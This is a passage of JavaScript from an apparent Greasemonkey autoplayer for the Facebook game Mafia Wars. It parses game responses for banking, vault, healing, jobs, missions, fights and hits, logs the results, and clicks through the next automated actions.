	    response = response.replace(/<div id="tab_container">/,'<div id="BuildCollectModule" style="width: 450px; height: 42px"><div id="BuildCollectModule" class="clearfix empire_module_title"><div style="float: left;"><span>PLAYER UPDATES</span></div></div><div id="tab_container" style="display:none;">');
	    response = response.replace(/<div class="playerupdate_box" style="width: 740px; margin: 10px 0; float: none; ">/,'<div class="playerupdate_box" style="width: 450px; height: 463px">');
	    response = response.replace(/<div class="tab_box_header" style="height: 35px">/,'<div class="tab_box_header" style="height: 28px">');
   	  context.innerHTML = response;
		  return false;
	  }

    if(action == 'marketplace'){
      var responseContainer = makeElement('div', document.getElementById('final_wrapper'), {'id':'responseContainer','style':'display:none;'});
      responseContainer.innerHTML = response;

      var eltContainer = makeElement('div', null, {'id':'marketInfo','style':'clear:both; width: 745px;','class':'clearfix'});
      var eltHeader = makeElement('div', eltContainer, {'id':'FightClubModule','style':'float: left; width: 735px;','class':'empire_module_header'});
      var eltTitle = makeElement('div', eltHeader, {'class':'empire_module_title'});
      var eltTitleSpan = makeElement('span', eltTitle);
        eltTitleSpan.appendChild(document.createTextNode('Fight Club'));

      var vcEltImg = xpathFirst('.//img[contains(@src,"victory_icon.gif")]', responseContainer);
      if(vcEltImg){
        vcElt = vcEltImg.parentNode;
        if(vcElt) {
          var eltVC = makeElement('div', eltTitle, {'style':'float:right;margin-right:15px'});
          eltVC.innerHTML += vcElt.innerHTML;
        }
      }

      var masteryBarElt = xpathFirst('.//div[@class="fightmastery_meter"]', responseContainer);
      if(masteryBarElt) {
        var eltMasteryBar = makeElement('div', eltTitle, {'class':'fightmastery_meter','style':'float:right;margin-right:45px;margin-top:-1px;'});
        eltMasteryBar.innerHTML += masteryBarElt.innerHTML;
      }

      var marketList = xpathFirst('.//div[@id="full_list"]', responseContainer);
      if(marketList){
        var eltSubContainer = makeElement('div', eltHeader, {'style':'width: 729px; padding: 5px; float: none;','class':'playerupdate_box'});
        var eltMarketList = makeElement('div', eltSubContainer);

        var itemListElts = $x('.//div[@style="position: relative;"]', marketList);

        firstElt = itemListElts[0].firstChild;
        secondElt = itemListElts[0].firstChild.nextSibling;
        thirdElt = itemListElts[0].firstChild.nextSibling.nextSibling;
        fourthElt = itemListElts[0].firstChild.nextSibling.nextSibling.nextSibling;
        itemListElt = makeElement('div',  eltMarketList, {'style':'float: left; width: 360px;height:150px;border:1px dotted #484848;padding-top:10px;'});
        itemListElt.innerHTML = secondElt.innerHTML+fourthElt.innerHTML;

        firstElt = itemListElts[1].firstChild;
        secondElt = itemListElts[1].firstChild.nextSibling;
        thirdElt = itemListElts[1].firstChild.nextSibling.nextSibling;
        fourthElt = itemListElts[1].firstChild.nextSibling.nextSibling.nextSibling;
        itemListElt = makeElement('div',  eltMarketList, {'style':'float: left; width: 360px;height:150px;border:1px dotted #484848;padding-top:10px;'});
        itemListElt.innerHTML = secondElt.innerHTML+fourthElt.innerHTML;

        var j=0;
        for(i=itemListElts.length-1;i>1;i--){
          firstElt = itemListElts[i].firstChild;
          secondElt = itemListElts[i].firstChild.nextSibling;
          thirdElt = itemListElts[i].firstChild.nextSibling.nextSibling;
          fourthElt = itemListElts[i].firstChild.nextSibling.nextSibling.nextSibling;
          //thirdEltInner = thirdElt.innerHTML;
            //if(thirdEltInner == 'Buy Now'){
              itemListElt = makeElement('div',  eltMarketList, {'style':'float: left; width: 240px;height:150px;border:1px dotted #484848;padding-top:10px;'});
              itemListElt.innerHTML = secondElt.innerHTML+fourthElt.innerHTML;
              j++;
            //}
          if(j==9) break;
        }

        var eltShadow = makeElement('div', eltContainer, {'style':'float: left; background: url("http://mwfb.static.zgncdn.com/mwfb/graphics/empire/shadow_upper_right.png") no-repeat scroll 0% 0% transparent; height: 8px; width: 8px;'});
        eltShadow = makeElement('div', eltContainer, {'style':'float: left; background: url("http://mwfb.static.zgncdn.com/mwfb/graphics/empire/shadow_right_side.png") repeat-y scroll 0% 0% transparent; height: 310px; width: 8px;'});
        eltShadow = makeElement('div', eltContainer, {'style':'float: left; background: url("http://mwfb.static.zgncdn.com/mwfb/graphics/empire/shadow_lower_left.png") repeat scroll 0% 0% transparent; height: 8px; width: 8px;'});
        eltShadow = makeElement('div', eltContainer, {'style':'float: left; background: url("http://mwfb.static.zgncdn.com/mwfb/graphics/empire/shadow_bottom.png") repeat scroll 0% 0% transparent; height: 8px; width: 727px;'});
        eltShadow = makeElement('div', eltContainer, {'style':'float: left; background: url("http://mwfb.static.zgncdn.com/mwfb/graphics/empire/shadow_lower_right.png") repeat scroll 0% 0% transparent; height: 8px; width: 8px;'});
      }

      context.appendChild(eltContainer);
		  return false;
	  }

	  var responseText = response.untag();

    // Analyze money related responses (collect take, check vault, deposit and withdraw)
    var cashLeft, acctBalance;
    var respJSON, respData;
    if (action == 'collect take' || action == 'check vault' || action == 'quick deposit' || action == 'quick withdraw') {
      if (!isNaN(context)) {
        context = parseInt(context);
        cashElt = document.getElementById('user_cash_' + cities[context][CITY_ALIAS]);
      }

      respJSON = JSON.parse(responseText);
	  if(typeof respJSON.user_fields.user_group_size != undefined) {
        var oSize = respJSON.user_fields.user_group_size;
        mafia = GM_getValue('userMafiaSize', 0);
        if(!mafia || mafia < oSize ) {
          mafia = oSize;
          GM_setValue('userMafiaSize', mafia);
          DEBUG('User Mafia Size set to :'+mafia);
        }
	  }
      if (action == 'quick deposit' && context != LV) {
        // Parse cash left for depositing anywhere but LV
        cashLeft = isNaN(respJSON.user_cash) ? null : parseInt(respJSON.user_cash);
      } else {
        // Parsing stuff for the remaining cases
        respData = JSON.parse(respJSON.data);
        cashLeft = isNaN(respData.cash) ? null : parseInt(respData.cash);
        if (action != 'collect take') {
          acctBalance = parseInt(respData.acct_balance);
          // Parse vault level and set free vault space
          if (GM_getValue('vaultHandling', 0) || action == 'check vault') {
            if (respJSON.data.match(/"name":"Vault","level":"?([0-9]+)"?,/i)) {
              var vaultLevel = parseInt(RegExp.$1);
              var vaultCapacity = vaultLevels[vaultLevel][1];
              var vaultSpace = vaultCapacity - acctBalance;
              if (action == 'check vault' && (vaultLevel != GM_getValue('vaultHandling', 0) || vaultSpace != GM_getValue('vaultSpace', 0)))
                addToLog(cities[LV][CITY_CASH_CSS], 'Parsed new vault status: Level ' + vaultLevel + ', free vault space: V$' + makeCommaValue(vaultSpace));
              else if (action == 'check vault')
                addToLog(cities[LV][CITY_CASH_CSS], 'No change in your vault: Level ' + vaultLevel + ', free vault space: V$' + makeCommaValue(vaultSpace));
              GM_setValue('vaultHandling', vaultLevel);
              GM_setValue('vaultSpace', String(vaultSpace));
            }
          }
        }
      }
      // Attempt to correct the displayed cash value
      if (cashLeft != null) {
        if (cashElt)
          cashElt.innerHTML = cities[context][CITY_CASH_SYMBOL] + makeCommaValue(cashLeft);
        cities[context][CITY_CASH] = cashLeft;
      }
    }

    switch (action) {
      // Parse Ice Check responses.
      case 'icecheck profile':
        var alive = !/is already dead or too weak!/.test(responseText);
        //var titleElt = xpathFirst('./div[@class="title"]', innerPageElt);
        if (context) {
          context.setAttribute('style', 'background: ' + (alive ? 'green;' : 'red;'));
          context.setAttribute('title', (alive ? 'Target is alive' : 'Target is iced') + ', click to refresh.');
          context.addEventListener('click', customizeProfile, false);
          DEBUG('Successfully set target status: ' + (alive ? 'alive.' : 'iced.'));
        }
        return false;
        break;
      case 'icecheck fightlist':
        var opponent = context.opponent;
        if (/is already dead or too weak!/.test(responseText)) {
          addToLog('info Icon','Target is iced/dead, skipping opponent, id=' + opponent.id);
          setFightOpponentInactive(opponent);

          // Cycle fight list
          cycleSavedList('pfightlist');
          return false;
        } else {
          var attackElt = context.attackElt;
          // Attack!
          Autoplay.fx = function() {
            clickAction = 'fight';
            clickContext = opponent;
            clickElement(attackElt);
            DEBUG('Clicked to fight: name=' + opponent.name +
            //      ', id=' + opponent.id + ', level=' + opponent.level +
                  ', level=' + opponent.level + ', mafia=' + opponent.mafia + ', faction=' + opponent.faction);
          };
          Autoplay.delay =  noDelay;
          Autoplay.start();
          return true;
        }
        break;

      // Log quickHeal() response.
      case 'quick heal':
        // Attempt to correct the displayed health value
        if (healthElt && responseText.match(/,"user_health":"?([0-9]+)"?,/i)) {
          healthElt.innerHTML = RegExp.$1;
        }
        if (responseText.match(/doctor healed ([0-9]+) health (.+?)\./i)) {
          if (autoplay) GM_setValue('healWaitStarted',false);
          var addHealth = RegExp.$1;
          var cost = RegExp.$2.match(REGEX_CASH);
          addToLog('health Icon', '<span style="color:#FF9999;">' + ' Health +'+ addHealth + ' for <span class="expense">' + cost + '</span>.</span>');
        } else if (/you cannot heal so fast/i.test(responseText)) {
          addToLog('warning Icon', '<span style="color:#FF9999;">' + 'Attempted to heal too quickly.' + '</span>');
        }
        else if (/have enough/i.test(responseText)) {
          respJSON = JSON.parse(responseText);
          var healCity = parseInt(respJSON.user_fields.current_city_id)-1;
          addToLog('warning Icon', '<span style="color:#FF9999;">' + 'You don\'t have enough money to heal in '+cities[healCity][CITY_NAME]+'.<br/>Disabling auto-heal.' + '</span>');
          GM_setValue('autoHeal', 'unchecked');
        }
        if (autoplay) {
          // Returning home after healing ensures that the home page still gets
          // checked occasionally during sustained periods of stamina spending.
          Autoplay.fx = goHome;
          Autoplay.delay = noDelay;
          Autoplay.start();
          return true;
        } else
          return false;
        break;

      // Parse Las Vegas vault data
      case 'check vault':
        setGMTime('checkVaultTimer', '00:30:00');
        respJSON = JSON.parse(responseText);
        respData = JSON.parse(respJSON.data);
        GM_setValue('casinoReport', JSON.stringify(respData));
        return false;
        break;

      // Parse Las Vegas casino data
      case 'check casino':
        respJSON = JSON.parse(responseText);
        respData = JSON.parse(respJSON.data);
        GM_setValue('casinoReport', JSON.stringify(respData));
        return false;
        break;

      // Casino Parts
      case 'casino parts':
        setGMTime('askCasinoPartsTimer', '2 hours');
        DEBUG('Parsed JSONResponse for clicking AskCasinoParts. Timer Reset for 2 hours.');
        return false;
        break;

// Purchase Port Item
      case 'purchase portItem':

        respJSON = JSON.parse(responseText);
        respData = JSON.parse(respJSON.data);
        var respMessage = respData.purchase_message;
        addToLog('info Icon', respMessage);

        if (responseText.match(/purchase_refresh_rate(.+?)(\d+?),/i)) {
          refreshRate = parseFloat(RegExp.$2);
          DEBUG('Refresh Rate: '+RegExp.$2);
        }

        if (responseText.match(/last_purchase_time_stamp(.+?)(\d+?),/i)) {
          timeStamp = parseFloat(RegExp.$2);
          DEBUG('timeStamp: '+RegExp.$2);
        }

        if(refreshRate && timeStamp) {
          var dueTime = timeStamp + refreshRate;
          var currentTime = Math.round(new Date().getTime()/1000.0);
          DEBUG('Current: '+currentTime);
          if(currentTime < dueTime){
            var timeLeft = parseFloat(dueTime) - parseFloat(currentTime);
            DEBUG('timeLeft: '+timeLeft);
            var timeLeftTxt = secondsToHMS(timeLeft);
            (timeLeftTxt ==1) ? timeLeftTxt+= ' hour' : timeLeftTxt+= ' hours';
            setGMTime('buildPortTimer', timeLeftTxt);
            DEBUG('Parsed JSONResponse for Purchasing Port Item. Timer Reset for '+timeLeftTxt+'.');
          } else {
            setGMTime('buildPortTimer', '2 hours');
            DEBUG('Parsed JSONResponse for Purchasing Port Item. Timer Reset for 2 hours.');
          }
        } else {
          setGMTime('buildPortTimer', '2 hours');
          DEBUG('Parsing JSONResponse for Purchasing Port Item FAILED. Timer Reset for 2 hours.');
        }
        return false;
        break;

      // Log any message from collecting property take.
      case 'collect take':
        DEBUG('Collect string take :'+JSON.stringify(respData));
        DEBUG('Collected take '+respData.description);
        setGMTime('takeHour' + cities[context][CITY_NAME], '1 hour'); // collect every 1 hour
        if (respData.description.match(/have collected (.+?) from your properties/i)) {
          var collectString = 'You have collected <span class="money">' + RegExp.$1 + '</span> from your properties.';
          addToLog(cities[context][CITY_CASH_CSS], collectString);
        }
        return false;
        break;

      // Log any message from withdrawing money.
      case 'quick withdraw':
        var logBalance = '<br>Remaining Bank Balance: ' + cities[context][CITY_CASH_SYMBOL] + makeCommaValue(acctBalance);
        if (/You Withdrew/i.test(respData.success_message)) {
          addToLog('cashVegas Icon', respData.success_message + logBalance);
        } else {
        //} else if(/Withdrawal failed/i.test(respData.success_message)) {
          addToLog('warning Icon', 'Disabling autoMission:<br>You don\'t have enough money to do ' +
                    missions[GM_getValue('selectMission', 1)][MISSION_NAME] + '.' + logBalance);
          GM_setValue('autoMission', 0);
          //newchange
          update_nrg_stam(); // update the icon to show energy spend is off
        }
        return false;
        break;

      // Log any message from depositing money.
      case 'quick deposit':
        // Log if city has changed after banking
        if (city != context) {
          addToLog('warning Icon', 'Warning! You have traveled from ' +
                   cities[context][CITY_NAME] + ' to ' +
                   cities[city][CITY_NAME] +
                   ' while banking. Check your money.');
        }

        if (context == LV) var respDeposit = respData.success_message;
        else var respDeposit = respJSON.deposit_message;

        // Money deposited (all cities)
        if (respDeposit.match(/\$([0-9,,]+).+?was deposited/i) ||                   // success for all cities except LV
            respDeposit.match(/You Deposited .\$([0-9,,]+) into your Vault/i)) {    // success for LV
          quickBankFail = false;
          var cashDeposit = RegExp.$1;
          addToLog(cities[context][CITY_CASH_CSS], '<span class="money">' + cities[context][CITY_CASH_SYMBOL] +
                   cashDeposit + '</span> was deposited ' + (context == LV ? 'into your vault.' : 'in your account after the bank\'s fee.'));

        // Las Vegas: too much money
        } else if (/cannot deposit this much/i.test(respDeposit) || /cannot deposit that much/i.test(respDeposit)) {
          quickBankFail = false;
          var logText = 'You can\'t deposit this much (you don\'t have enough cash or your vault is to small).';
          if (!GM_getValue('vaultHandling', 0)) logText += '<br>Please consider enabling PS MWAP vault handling.';
          addToLog(cities[context][CITY_CASH_CSS], logText);
        // Las Vegas: vault full
        } else if (/cannot deposit any more/i.test(respDeposit)) {
          quickBankFail = false;
          var logText = 'You can\'t deposit anymore, your vault is full!';
          if (!GM_getValue('vaultHandling', 0)) logText += '<br>Please consider enabling PS MWAP vault handling.';
          addToLog(cities[context][CITY_CASH_CSS], logText);
          if (GM_getValue('vaultHandling', 0)) GM_setValue('vaultSpace', '0');
        // Las Vegas: invalid amount
        } else if (/invalid amount/i.test(respDeposit)) {
          quickBankFail = false;

        // Not enough money
        } else if (/have enough money/.test(respDeposit)) {
          quickBankFail = false;
        // Minimum deposit not met ($10)
        } else if (/deposit at least/.test(respDeposit) && respDeposit.match(/\$([0-9,,]+)/)) {
          quickBankFail = false;
          addToLog(cities[context][CITY_CASH_CSS],
                   'You need to deposit at least <span class="money">' + cities[context][CITY_CASH_SYMBOL] +
                   RegExp.$1);

        // Las Vegas: no vault?
        } else if (respData.result == null || acctBalance == 0) {
          quickBankFail = false;
          addToLog(cities[context][CITY_CASH_CSS], 'Depositing failed without a response; if you are in Las Vegas, perhaps you don\'t have a vault yet?');
          if (GM_getValue('vaultHandling', 0)) GM_setValue('vaultSpace', '0');

        // Unknown JSON response
        } else {
          quickBankFail = true;
          addToLog('warning Icon', 'Quick Deposit failed: Unknown JSON response:<br>' + responseText);
          //DEBUG('Deposit: Unknown JSON response:<br>' + responseText);
        }
        return false;
        break;
      default:
        addToLog('warning Icon', 'BUG DETECTED: Unrecognized JSON action "' + action + '".<br>' + responseText);
        return false;
    }
  } catch (ex) {
    DEBUG('Exception (logJSONResponse): ' + ex + ', autoplay: ' + autoplay + ', action: ' + action + ', context: ' + context + ', response: <br>' + responseText);
  }
}

// Interprets the response to an action that was taken.
//
// rootElt: An element whose descendents contain the response to interpret.
// action:  The action taken, such as 'fight', 'heal', 'hitlist', etc.
// context: (optional) Any further data needed to describe the action
// Returns: true if something has been done that will cause the inner page
//          to change, such as clicking somewhere or loading another page.
function logResponse(rootElt, action, context) {
  // Set default timer properties.
  Autoplay.fx = goHome;
  Autoplay.delay = getAutoPlayDelay();

  // Fight message
  var messagebox = xpathFirst('.//div[@class="fight_results"]', rootElt);

  // Crate selling pop-up message
  if (!messagebox) {
    messagebox = xpathFirst('.//div[@id="default_id_box"]', rootElt);
  }

  // Normal message
  if (!messagebox) {
    messagebox = xpathFirst('.//table[@class="messages"]', rootElt);
  }

  // New job layout message result
  if (!messagebox) {
    messagebox = xpathFirst('.//div[@class="job_results"]', rootElt);
  }

  //if (!messagebox) {
  //  messagebox = xpathFirst('.//div[@class="job_container"]', rootElt);
  //}

  // New message box message
  if (!messagebox) {
    messagebox = xpathFirst('.//div[@id="msg_box_div_1"]', rootElt);
  }

  // Message box (new header)
  if (!messagebox) {
    messagebox = xpathFirst('.//div[@id="mbox_generic_1"]', rootElt);
  }

  // Bank message
  if (!messagebox) {
    messagebox = xpathFirst('.//div[@id="bank_messages"]', appLayoutElt);
  }

  // Hospital message
  if (!messagebox) {
    messagebox = xpathFirst('.//div[@id="hospital_message"]', appLayoutElt);
  }

  // Rob message
  if (!messagebox) {
    messagebox = xpathFirst('.//div[@id="'+ context +'" and @class="rob_slot"]', rootElt);
  }
  if (!messagebox) {
    messagebox = xpathFirst('.//div[@class="rob_board"]', rootElt);
  }

  // Build Car/Weapon success popup
  if(!messagebox) {
    messagebox = xpathFirst('.//div[@class="chop_build_final"]', appLayoutElt);
  }

  if (!messagebox) {
  messagebox = xpathFirst('.//div[ contains (@id,"missionTask_'+Miss_Slot+'_'+Miss_ID+'_module")]', rootElt);  //shows total mastery result
//      if (messagebox) {  DEBUG(' found messagebox result - '); }  //
  } //doatest
//  if (!messagebox) { DEBUG(' NO messagebox result found - mission or otherwise '); }

  if (action=='withdraw' && context) {
    autoBankWithdraw(context);
    Autoplay.start();
    return true;
  }
  if (!messagebox) {
    if(action == 'help') return true; // no message box for help message.  Just continue on.
    if(action == 'autohit') return false;
    DEBUG('Unexpected response page: no message box found - logResponse: HTML=<br/>' + rootElt.innerHTML);

    // If fighting from a user-specified list, cycle it.
    // Otherwise, the problem might repeat indefinitely.
    if (action == 'fight' && GM_getValue('staminaSpendHow') == getStaminaMode()) cycleSavedList('pfightlist');

    return false;
  }

  // Since the attempted action received a response, stop skipping fight.
  skipStaminaSpend = false;

  var inner = messagebox? messagebox.innerHTML : '';
  var innerNoTags = inner.untag();
  var cost, experience, result;

  switch (action) {
    case 'autohit':
    case 'fight':
      return logFightResponse(rootElt, messagebox, context);
      break;

    case 'autoRob':
      if (!isGMChecked('fastRob')) return logRobResponse(rootElt, messagebox, context);
      else {
        randomizeStamina();
        Autoplay.fx = goRobbingTab;
        Autoplay.delay = noDelay;
        Autoplay.start();
        return true;
      }

    case 'heal':
    case 'quick heal':
      if (innerNoTags.indexOf('doctor healed') != -1) {
        GM_setValue('healWaitStarted',false);
        var addHealth = inner.split('doctor healed <strong>')[1].split('health')[0];
        cost = innerNoTags.match(REGEX_CASH);
        addToLog('health Icon', '<span style="color:#FF9999;">' + ' Health +'+ addHealth + ' for <span class="expense">' + cost + '</span>.</span>');
      } else if (innerNoTags.indexOf('You cannot heal so fast') != -1) {
        addToLog('warning Icon', '<span style="color:#FF9999;">' + 'Attempted to heal too quickly.' + '</span>');
      }

      // Returning home after healing ensures that the home page still gets
      // checked occasionally during sustained periods of stamina spending.
      Autoplay.fx = goHome;
      Autoplay.delay = noDelay;
      Autoplay.start();
      return true;
      break;

    case 'Missionjob':
 //doatest
      var Mission_ResultsElt = xpathFirst('.//div[@class="task_results"]', messagebox);
      if(Mission_ResultsElt) {
        var xpGainTxt;
        var cashGainTxt;
        var Mission_Node = Mission_ResultsElt.parentNode;
        var Mission_Name_Elt = xpathFirst('.//div[@class="doTaskName"]', Mission_Node);
        if (!Mission_Name_Elt) Mission_Name_Elt = xpathFirst('.//span[@class="doTaskName"]', Mission_Node);
        if (Mission_Name_Elt) Mission_Name = Mission_Name_Elt.innerHTML;

        var xpGainElt = xpathFirst('.//dd[@class="experience doTaskDDHeight"]', Mission_ResultsElt);
        if(xpGainElt) {
          xpGainTxt = parseInt(xpGainElt.innerHTML);
          if(xpGainTxt) xpGainTxt += " experience";
        }

        var cashGainElt = xpathFirst('.//dd[@class="italy_cash_icon doTaskDDHeight"]', Mission_ResultsElt);
        bankCity = ITALY;
        if(!cashGainElt) {
          cashGainElt = xpathFirst('.//dd[@class="vegas_cash_icon doTaskDDHeight"]', Mission_ResultsElt);
          bankCity = LV;
        }
        if(cashGainElt) {
          cashGainTxt = cashGainElt.innerHTML;
          if(cashGainTxt.match(/[\d,]*\d/i)) cashGainTxt = cities[bankCity][CITY_CASH_SYMBOL]+RegExp.lastMatch;
        }
        DEBUG('found Mission_ResultsElt');

        if(xpGainElt && cashGainElt) {
          if(xpGainTxt && cashGainTxt) {
            var result = 'You performed <span class="job">'+Mission_Name+'</span>, gaining <span class="good">'+xpGainTxt+'</span> and <span class="good">'+cashGainTxt+'</span>.';
          } else {
            var result = 'You performed <span class="job">'+Mission_Name+'</span>, gaining <span class="good">'+Miss_Pay_Exp+'</span> and <span class="good">'+Miss_Pay_Cash+'</span>.';
          }
        } else {
          var result = 'You tried to perform <span class="job">'+Mission_Name+'</span>, but you don\'t have enough energy or stamina to do the job.';
        }
        addToLog('process Icon', result);

// fails for checking errors
//      Mission_Results = xpathFirst('.//h4[contains@style="border"  and contains(text(),"FAILURE")]', Mission_ResultsElt);
//if(Mission_Results) DEBUG('found Mission_Results');

        masteryGainElt = xpathFirst('.//div[@class="doTaskMastery"]', messagebox);
        //xpGainElt = xpathFirst('.//dd[@class="experience"]', messagebox);
        var masteryGainTxt = "";
        var pushNextJob = false;
        // IF we have the mastery gain bar,
         DEBUG(' checking mastery Mission ID :'+Miss_ID  );
        if(masteryGainElt) {
          if( (parseInt(masteryGainElt.innerHTML.substr(0, masteryGainElt.innerHTML.indexOf('%'))) )==100 ) {
            masteryGainTxt = '. Missions Task ' + masteryGainElt.innerHTML.substr(0, masteryGainElt.innerHTML.indexOf('%')) + '% Mastered';
            pushNextJob = true;
          } else {
            masteryGainTxt = '. Missions Task ' + masteryGainElt.innerHTML.substr(0, masteryGainElt.innerHTML.indexOf('%')) + '% Mastered';
            DEBUG(' NO mastery '+Miss_ID  + masteryGainTxt );
          }
        }
      }
//////////// add stuff here
//////////// add stuff here
      var Finish_Mission;
      if (pushNextJob) {
        // DEBUG('Job Mastery of 100% detected, Reloading Tabno :'+tabno );
        DEBUG('Job Mastery of 100% detected, Reloading nothing:' );
        Finish_Mission = xpathFirst('.//a[contains(@id,"sm_action_button_'+Miss_ID+'") and contains(@class,"sexy_button_new medium black") and contains(@onclick,"SocialMissionView.closeTask(\''+Miss_ID+'")]', innerPageElt);
        if(Finish_Mission) {
//        DEBUG(' we found the finished marker, close button' );
          clickElement(Finish_Mission);
//        if(!Check_Mission_Job()){  Go_Nxt_Page();  } // load stuff for next mission and try to start it // if there was nothing else on this page, try to go to the next page
        } else {
          Diagnose(' mission we did not find the finished close button' );
        }
        Miss_ID = null;
        GoMissionsTab();
      } else {
        if((!chk_stam()) || (!chk_nrg()) ) {
          Diagnose(' mission setting timer, you dont have enough to perform:' + Miss_Name_is );
          setmissiontimer();
          Miss_ID = null;
          return false;
        }
        return;
      }
      Autoplay.start();
      return true;
      break;

    case 'job':
      var masteryGainElt ;
      xpGainElt = xpathFirst('.//dd[@class="message_experience"]', messagebox);
      xpGainElt = xpGainElt ? xpGainElt : xpathFirst('.//dd[@class="experience"]', messagebox);
      var jobContainer = "job"+missions[GM_getValue('selectMission')][MISSION_NUMBER];
      var jobContainerElt = xpathFirst('.//div[@id="'+jobContainer+'"]', rootElt);
      masteryGainElt = xpathFirst('.//div[@id="'+jobContainer+'"]//div[@class="mastery_bar"]', rootElt);
      jobName = missions[GM_getValue('selectMission')][MISSION_NAME];

      var masteryGainTxt = "";
      var pushNextJob = false;
      // IF we have the mastery gain bar,
      if(masteryGainElt) {
        //if( (GM_getValue('selectTier')!= '0.0'  ) || (!isGMChecked('multipleJobs'))  ) {
        if( (GM_getValue('selectTier')!= '0.0'  )) {
          if( (parseInt(masteryGainElt.innerHTML.substr(0, masteryGainElt.innerHTML.indexOf('%'))) )==100 ) {
            masteryGainTxt = '. Job ' + masteryGainElt.innerHTML.substr(0, masteryGainElt.innerHTML.indexOf('%')) + '% Mastered';
            pushNextJob = true;
          }
        }
      }

      if (xpGainElt) {
        jobOptimizeOn = false;
        var xpGainTxt = parseInt(xpGainElt.innerHTML);

        if(xpGainTxt) {
          var xpBonusElt = xpathFirst('.//div[@class="message_experience"]', messagebox);
          if(xpBonusElt) xpGainTxt+= ' + ' + parseInt(xpBonusElt.innerHTML);
          xpGainTxt += " Experience";
        }
        // Job completed successfully.
        result = 'You performed ' + '<span class="job">' + jobName + '</span> earning <span class="good">' + xpGainTxt + '</span>';
        var cashGainTxt='';
        var cashGainElts = $x('.//dd[@class="message_cash"]', messagebox);
        for(i=0;i<cashGainElts.length;i++){
         cashGainTxt += cashGainElts[i].innerHTML;
        }

        if(cashGainElts.length==0){
          cashGainElt = xpathFirst('.//dd[@class="vegas_cash_icon"]', messagebox);
          bankCity = LV;
          if (!cashGainElt) {
            cashGainElt = xpathFirst('.//dd[@class="italy_cash_icon"]', messagebox);
            bankCity = ITALY;
          }
          if (cashGainElt) {
            cashGainTxt = cashGainElt.innerHTML;
            if (cashGainTxt.match(/[\d,]*\d/i)) cashGainTxt = cities[bankCity][CITY_CASH_SYMBOL]+RegExp.lastMatch;
            else cashGainTxt = cities[bankCity][CITY_CASH_SYMBOL] + cashGainTxt;
          }
        }
        if(cashGainTxt) result += ' and <span class="good">' + cashGainTxt + '</span>';

        var cashSpendElt = xpathFirst('.//dt[@class="message_cash bad"]', messagebox);
        if(cashSpendElt) {
          var cashSpendTxt = cashSpendElt.innerHTML.untag();
          if (cashSpendTxt.match(/(.+?)\s+?Bribes/)) cashSpendTxt = RegExp.$1;
          result += ', spending <span class="bad">' + cashSpendTxt + '</span>';
        }

        if(masteryGainElt) result += masteryGainTxt;
        result += '.';
        if (innerNoTags.indexOf('you spent no energy') != -1 || innerNoTags.indexOf('No energy cost') != -1 ||innerNoTags.indexOf('You Spent: 0') != -1 ) result += ' You spent 0 energy on this job.';
        addToLog('process Icon', result);

        jobCombo(rootElt);
        if(masteryGainElt) jobLoot(jobContainerElt); // here
        else jobLoot(rootElt);
        // Add message if job tier prize found.
        if (innerNoTags.match(/.*(An* .+ was added to your inventory[^.]*.)/i)) {
          addToLog('lootbag Icon', RegExp.$1);
        }

        // Ask for help if auto ask is on and enough experience was gained.
        var xpGain = parseInt(xpGainElt.innerHTML);
        var parentClass="";
        var xpGainMin = parseInt(GM_getValue('autoAskJobHelpMinExp'));
        if (isGMChecked('autoAskJobHelp') && (!xpGainMin || xpGain >= xpGainMin)) {
          // ask for help NY and Cuba - depending on job results
          var elt = xpathFirst('.//div[@class="message_buttons"]//span[@class="sexy_jobhelp"]', messagebox);
          if(!elt) elt = xpathFirst('.//div[@class="message_buttons"]//a[@class="sexy_button_new short white sexy_call_new" and contains(.,"Let Friends Get a Bonus")]', messagebox);
          if (elt) {
            Autoplay.fx = function() {
              clickElement(elt);
              addToLog('process Icon', 'Asked for help with <span class="job">' + missions[GM_getValue('selectMission')][MISSION_NAME] + '</span>.');
            };
            Autoplay.start();
            return true;
          }
        }
      } else if (innerNoTags.indexOf('You are not high enough level to do this job') != -1) {
        addToLog('warning Icon', 'You are not high enough level to do ' + missions[GM_getValue('selectMission', 1)][MISSION_NAME] + '.');
        addToLog('warning Icon', 'Job processing will stop');
        GM_setValue('autoMission', 0);
        //newchange
        update_nrg_stam(); // update the icon to show energy spend is off
      } else if (innerNoTags.indexOf('Success') != -1) {
        jobOptimizeOn = false;
        addToLog('process Icon', inner);
      } else if (innerNoTags.indexOf('Missing') != -1) {
        if (getJobRowItems(jobName)) {
          DEBUG(' - - need items jobid='+jobid+' selectMission='+GM_getValue('selectMission', 1));
          if (jobid != GM_getValue('selectMission', 1))  Autoplay.fx = autoMission;
        }
      } else {
        DEBUG('Unrecognized job response.');
      }

      if (pushNextJob) {
        goJobsNav();
      } else {
        return;
      }
      Autoplay.start();
      return true;
      break;

    case 'hitman':
      // If the target is gone, there is nothing to do.
      if (innerNoTags.indexOf('someone else took out') != -1) {
        DEBUG(inner);
        return false;
      }

      var targetKilled = (innerNoTags.indexOf('You knocked out') != -1);
      if (innerNoTags.indexOf('You WON') != -1) {
        var cashGain = innerNoTags.match(/gained.*?([A-Z]?\$[\d,]*\d)/i);
        var cashWon = RegExp.$1;
        experience = innerNoTags.match(/\d+\s+experience\s+points?/i);
        addToLog('yeah Icon', 'Hit ' + linkToString(context.profile, 'user') +
                 ', <span class="good">WON ' + cashWon + '</span> and ' +
                 '<span class="good">' + experience + '</span>.');
        cashWon = parseCash(cashWon);
        GM_setValue('hitmanWinCountInt',GM_getValue('hitmanWinCountInt',0)+1);
        GM_setValue('hitmanWinDollarsInt', String(parseInt(GM_getValue('hitmanWinDollarsInt', 0)) + cashWon));
        GM_setValue('totalExpInt', GM_getValue('totalExpInt', 0) + parseInt(experience));
        GM_setValue('totalWinDollarsInt', String(parseInt(GM_getValue('totalWinDollarsInt', 0)) + cashWon));
        GM_setValue('fightWin$NY', String(parseInt(GM_getValue('fightWin$NY', 0)) + cashWon));

        if (!targetKilled && canSpendStamina() && ptsToNextLevel > 6) {
          var eltAtk = xpathFirst('.//a[contains(.,"Attack Again")]', messagebox);
          if (eltAtk) {
            // Attack again immediately.
            Autoplay.fx = function() {
              clickAction = action;
              clickContext = context;
              speedClick(eltAtk);
              DEBUG('Clicked to repeat the hit on ' + clickContext.name +
                    ' (' + clickContext.id + ').');
            };
            updateLogStats(STAMINA_HOW_HITMAN);
            Autoplay.delay = noDelay;
            Autoplay.start();
            return true;
          }
        }
      } else if (innerNoTags.indexOf('You LOST') != -1) {
        var t = innerNoTags.match(/LOST.*?([A-Z]?\$[\d,]*\d)/i);
        var cashLoss = RegExp.$1;
        result = 'Hit ' + linkToString(context.profile, 'user') +
